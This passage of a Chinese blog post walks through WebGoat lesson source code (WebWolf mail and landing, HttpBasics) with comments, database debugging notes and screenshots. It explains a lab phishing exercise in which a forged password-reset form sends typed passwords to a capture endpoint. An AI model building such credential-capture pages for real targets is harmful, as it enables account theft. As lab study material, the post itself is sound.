&#125;</span><br><span class="line">            <span class="keyword">return</span>  informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;webwolf.email_send&quot;</span>).feedbackArgs(email).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;webwolf.email_mismatch&quot;</span>).feedbackArgs(username).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/WebWolf/mail&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String uniqueCode)</span>&#123;</span><br><span class="line"><span class="comment">//        首先获取post表单 uniqueCode</span></span><br><span class="line">        <span class="keyword">if</span> (uniqueCode.equals(StringUtils.reverse(getWebSession().getUserName())))&#123;</span><br><span class="line"><span class="comment">//            将获取到的值进行逆序与当前用户名进行对比 为什么是逆序看上面的mailEvent 赋值操作</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line"><span class="comment">//            这里如果相等就完成了这项挑战调用success </span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedbackArgs(<span class="string">&quot;webwolf.code_incorrect&quot;</span>).feedbackArgs(uniqueCode).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824191613764.png" alt="image-20220824191613764"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824201107883.png" alt="image-20220824201107883"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824202804678.png" alt="image-20220824202804678"></p>
<p>这里可以看到是自动装配的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824204453426.png" alt="image-20220824204453426"></p>
<p>这里也查找的Bean容器可见下面仅仅是设置了一下基础信息 我们进去pluginMessages()构造方法看看先</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824204703643.png" alt="image-20220824204703643"></p>
<p>这里也是比较简单的进行了基础值的赋值操作 我们先来看看这个Messages</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824204828368.png" alt="image-20220824204828368"></p>
<p>可以看到这里的setBasename</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824210408565.png" alt="image-20220824210408565"></p>
<p>清楚看到可以读取这里的messages配置文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824210505308.png" alt="image-20220824210505308"></p>
<p>我们接着去看refreshProperties</p>
<p>这里可以看到我们自己并没有去调用这个refreshProperties() 说明这里也是框架给我们调用的 这里我们分析一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824205225984.png" alt="image-20220824205225984"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824213012109.png" alt="image-20220824213012109"></p>
<h3 id="Email-1"><a href="#Email-1" class="headerlink" title="Email"></a>Email</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.webwolf_introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="comment">// @Builder作用见下图</span></span><br><span class="line"><span class="comment">//可以通过链式调用的方法给类中的参数进行赋值</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="comment">//作为数据类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Email</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String contents;</span><br><span class="line">    <span class="keyword">private</span> String sender;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String recipient;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824191142252.png" alt="image-20220824191142252"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824191212840.png" alt="image-20220824191212840"></p>
<p>简单易懂</p>
<h3 id="排错-1"><a href="#排错-1" class="headerlink" title="排错"></a>排错</h3><p>但是这里发送邮箱会报错</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822215626523.png" alt="image-20220822215626523"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822215626523.png"></p>
<p>将id自增策略更改如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GeneratedValue(strategy =  GenerationType.IDENTITY)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220822215551416.png" alt="image-20220822215551416"></p>
<p>这里更改完成之后遇到了一个无法解决的报错 说表并不存在 但是我翻遍了也没找到这个表在哪建的 因此我觉得换回原先的hsqldb数据库,但是这个数据库存在一个极大的弊端就是他的连接只能存在一个也就是如果项目启动起来的时候,就无法通过</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823123531389.png" alt="image-20220823123531389"></p>
<h3 id="更换为hsqldb并进行连接查看"><a href="#更换为hsqldb并进行连接查看" class="headerlink" title="更换为hsqldb并进行连接查看"></a>更换为hsqldb并进行连接查看</h3><p>首先我们换回配置文件</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124025849.png" alt="image-20220823124025849"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124210014.png" alt="image-20220823124210014"></p>
<p>这里成功启动起来</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124233038.png" alt="image-20220823124233038"></p>
<p>我们尝试去连接 </p>
<p>首先这里存在几个值路径信息 url 数据库 用户 和密码 很明显这里的路径信息和数据库肯定是用来拼接最后的url的,首先我们尝试获取一下这里的值</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124328862.png" alt="image-20220823124328862"></p>
<p>一种比较简单的方式就是去查看我们项目启动后输出的日志信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124454018.png" alt="image-20220823124454018"></p>
<p>第二种方式 这里我们可以去自己去寻找具体路径是如何进行拼接的然后自己去查看位置</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124542653.png" alt="image-20220823124542653"></p>
<p>第三种方式我们尝试去输出一下日志信息</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823124943809.png" alt="image-20220823124943809"></p>
<p>下一个问题我们如何去寻找用户名密码 首先我尝试了无密码的认证方式,发现并未通过</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125109247.png" alt="image-20220823125109247"></p>
<p>接下来我开始翻看这些文件 在这里发现了两个特殊的参数 前面这个SA一看就是用户名 后面的一看就是一个MD5值</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125145717.png" alt="image-20220823125145717"></p>
<p>发现是空密码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125245662.png" alt="image-20220823125245662"></p>
<p>但是第一次其实并没有连接成功主要原因其实就是我的项目已经启动了,因此占用着这个进程,导致我的连接失败了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125438715.png" alt="image-20220823125438715"></p>
<p>停止项目之后就连接成功了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125547412.png" alt="image-20220823125547412"></p>
<p>其次这里需要在架构这里添加上所有的数据库</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125800211.png" alt="image-20220823125800211"></p>
<p>这里我们如果想要去更改用户名和密码的话,相信你也能想到了</p>
<p>更改这个文件并更改配置文件即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125647530.png" alt="image-20220823125647530"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823130027522.png" alt="image-20220823130027522"></p>
<p>现在便成功的连接上了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125824892.png" alt="image-20220823125824892"></p>
<p>当需要启动项目时点击停用即可 不知道有没有方式可以去实现同时连接</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823125901966.png" alt="image-20220823125901966"></p>
<p>这里需要先对数据进行初始化</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823181703373.png" alt="image-20220823181703373"></p>
<p>测试下邮箱功能 注意这里的@前面需要是一个你注册的用户名</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823210827974.png" alt="image-20220823210827974"></p>
<p>去webwolf可以查看到</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823210956649.png" alt="image-20220823210956649"></p>
<p>这里根据这个unique也可以查看到成功完成了这项挑战</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220823211013116.png" alt="image-20220823211013116"></p>
<h3 id="LandingAssignment"><a href="#LandingAssignment" class="headerlink" title="LandingAssignment"></a>LandingAssignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.webwolf_introduction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LandingAssignment</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;webwolf.landingpage.url&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String landingPageUrl;</span><br><span class="line"><span class="comment">//    同样的webwolf的landing的url在配置文件中可找</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/WebWolf/landing&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">click</span><span class="params">(String uniqueCode)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.reverse(getWebSession().getUserName()).equals(uniqueCode))&#123;</span><br><span class="line"><span class="comment">//           如果将当前用户名字逆向对比为外部输入uniqueCode</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;webwolf.landing_wrong&quot;</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/WebWolf/landing/password-reset&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">openPasswordReset</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> URISyntaxException&#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(request.getRequestURI().toString());</span><br><span class="line"><span class="comment">//        对一个url进行拆分 如http 127.0.0.1 8081 /webwolf</span></span><br><span class="line">        <span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;webwolfUrl&quot;</span>,landingPageUrl);</span><br><span class="line"><span class="comment">//        添加两个model 一个url 一个 uncode</span></span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;uniqueCode&quot;</span>,StringUtils.reverse(getWebSession().getUserName()));</span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;lessons/webwolf_introduction/templates/webwolfPasswordReset.html&quot;</span>);</span><br><span class="line"><span class="comment">//        设置视图 映射到哪一个html文件 根据路径去可以简单找到</span></span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824222750024.png" alt="image-20220824222750024"></p>
<p>可以看到这里是一个form表单 而且当点击save之后会向webwolfurl去发送请求</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824222816406.png" alt="image-20220824222816406"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220824223002352.png" alt="image-20220824223002352"></p>
<p>到这里我们先放一下去看一下webwolf 的landing是怎么配置的</p>
<p>这里也比较简单能够理解就是当请求&#x2F;landing&#x2F;**路径下时会打印一个日志 这里我们暂时看不出问题来 所以我们先去看requests</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095155593.png" alt="image-20220825095155593"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095148670.png" alt="image-20220825095148670"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095920808.png" alt="image-20220825095920808"></p>
<p>这里很容易找到其实这里的初始化操作是在@Bean执行的而且是交给spring容器管理的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825095907977.png" alt="image-20220825095907977"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825100305798.png" alt="image-20220825100305798"></p>
<p>现在我们已经知道了我们的http请求其实是存放在traces中的,那么是在什么时候添加进去的呢?</p>
<p>可以看到其实是spring自动调用的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825110424447.png" alt="image-20220825110424447"></p>
<p>这里我进行了简单的尝试,发现在进入return语句之后 在log.trace执行之前调用了add方法.这里不太能理解为什么.主要是一个http请求应该包括响应 那么按理应该是在所有的return结束之后在调用才对啊.</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825110800731.png" alt="image-20220825110800731"></p>
<p>我们去看一下request</p>
<p> 这里可能有点难以理解 刚开始我不知道这个t是如何去赋值的 其实这里简单的理解 就是首先我们traceRepository.findAllTraces() 这个获取的是一个list 而后面的stream()其实就代表着一个一个的去读取 接着呢 在每一次读取之中进行了过滤filter 操作 ,而由于每一次读取的时候是读取到了一个HttpTrace对象,那么这个参数t自然就是读取到的这个HttpTrace对象了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825113223673.png" alt="image-20220825113223673"></p>
<p>下面这里也很好理解就是转换成json格式的数据</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825144305039.png" alt="image-20220825144305039"></p>
<p>将得到的值进行存入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825145014574.png" alt="image-20220825145014574"></p>
<p>现在可以完全理解这个系统了吗</p>
<p>这里的更改密码其实是攻击者伪造的更改密码链接 但是其实这里点击save之后会跳转 实战时是需要进行重新修改的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825145300839.png" alt="image-20220825145300839"></p>
<p>当我们更改之后就会将更改的密码发送到</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825145344751.png" alt="image-20220825145344751"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825150618105.png" alt="image-20220825150618105"></p>
<p>由于webwolf会存储landing路径下的请求因此这里会进行展示</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825150857974.png" alt="image-20220825150857974"></p>
<p>提交即可过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825150925418.png" alt="image-20220825150925418"></p>
<h2 id="http-basics"><a href="#http-basics" class="headerlink" title="http_basics"></a>http_basics</h2><h3 id="HttpBasics"><a href="#HttpBasics" class="headerlink" title="HttpBasics"></a>HttpBasics</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.http_basics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="comment">//实现bean的注入,当我们的类不属于@controller @services的时候我们就可以使用@component来标注这个类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpBasics</span>  <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.GENERAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1.http-basics.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>介绍</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825153410260.png" alt="image-20220825153410260"></p>
<h3 id="HttpBasicsLesson"><a href="#HttpBasicsLesson" class="headerlink" title="HttpBasicsLesson"></a>HttpBasicsLesson</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.http_basics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;http-basics.hints.http_basics_lesson.1&quot;&#125;)</span></span><br><span class="line"><span class="comment">//这里的hints需要我们重点去看</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpBasicsLesson</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/HttpBasics/attack1&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String person)</span>&#123;</span><br><span class="line"><span class="comment">//        获取person参数</span></span><br><span class="line">        <span class="keyword">if</span> (!person.isBlank())&#123;</span><br><span class="line"><span class="comment">//            如果字符串不仅仅是包含空字符</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>)</span><br><span class="line">                    .feedback(<span class="string">&quot;http-basics.reversed&quot;</span>)</span><br><span class="line">                    .feedbackArgs(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(person).reverse().toString())</span><br><span class="line">                    .build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;http-basics.empty&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的show hints其实是注解 我们需要去看看</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825155519406.png" alt="image-20220825155519406"></p>
<p>这里存在我们对AssignmentHints接口的定义 其中有一个value参数</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825155628662.png" alt="image-20220825155628662"></p>
<p>在这里我们找到了用法</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825155726264.png" alt="image-20220825155726264"></p>
<p>一步步往上查找</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825160517445.png" alt="image-20220825160517445"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825160538706.png" alt="image-20220825160538706"></p>
<p>这里可见对course进行了bean的注入</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825160729294.png" alt="image-20220825160729294"></p>
<p>感觉这里其实是无法调用到的 找遍也没有发现那个请求发送到这里 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825161854634.png" alt="image-20220825161854634"></p>
<p>其次在StartLesson类的构造方法我并未找到有用户调用 那么原因是不是由于@Controller导致该类有springboot帮助我们去调用了</p>
<p>接着我们去看bean对象的赋值</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825164550766.png" alt="image-20220825164550766"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825164632442.png" alt="image-20220825164632442"></p>
<p>现在我们去看new Assignment</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825164901828.png" alt="image-20220825164901828"></p>
<p>现在我们已经理解了hints存储在了哪里,接下来我们去寻找哪里进行了调用获取hints</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825170206161.png" alt="image-20220825170206161"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825170219828.png" alt="image-20220825170219828"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825170449078.png" alt="image-20220825170449078"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825171015851.png" alt="image-20220825171015851"></p>
<p>一个hint 一个路径</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825171032480.png" alt="image-20220825171032480"></p>
<p>聪明的你一定发现了 这里的hint并不是点击请求的而是一次性请求 存储在前端的</p>
<p>那么这关我们只要不输入空字符即可过关</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825171630319.png" alt="image-20220825171630319"></p>
<h3 id="HttpBasicsQuiz"><a href="#HttpBasicsQuiz" class="headerlink" title="HttpBasicsQuiz"></a>HttpBasicsQuiz</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.http_basics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentPath;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;http-basics.hints.http_basic_quiz.1&quot;,&quot;http-basics.hints.http_basic_quiz.2&quot;&#125;)</span></span><br><span class="line"><span class="meta">@AssignmentPath(&quot;HttpBasics/attack2&quot;)</span></span><br><span class="line"><span class="comment">//这里AssignmentPath 需要去看下</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpBasicsQuiz</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/HttpBasics/attack2&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String answer,<span class="meta">@RequestParam</span> String magic_answer,<span class="meta">@RequestParam</span> String magic_num)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;POST&quot;</span>.equalsIgnoreCase(answer) &amp;&amp; magic_answer.equals(magic_num))&#123;</span><br><span class="line"><span class="comment">//            如果post请求参数中answer与POST字符相同并且参数中magic_answer 与 magic_num相同就过关</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&quot;POST&quot;</span>.equalsIgnoreCase(answer))&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;http-basics.incorrect&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!magic_answer.equals(magic_num))&#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;http-basics.magic&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里AssignmentPath 并没有去使用 推测可能是webgoat没有写完</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825180659450.png" alt="image-20220825180659450"></p>
<p>这里可能需要去抓包 先去看一下请求方式和 magic number</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825180917463.png" alt="image-20220825180917463"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825180911483.png" alt="image-20220825180911483"></p>
<p>或者直接观察前端代码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825181029995.png" alt="image-20220825181029995"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220825181103415.png" alt="image-20220825181103415"></p>
<h2 id="http-proxies"><a href="#http-proxies" class="headerlink" title="http_proxies"></a>http_proxies</h2><h3 id="HttpProxies"><a href="#HttpProxies" class="headerlink" title="HttpProxies"></a>HttpProxies</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.http_proxies;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpProxies</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title 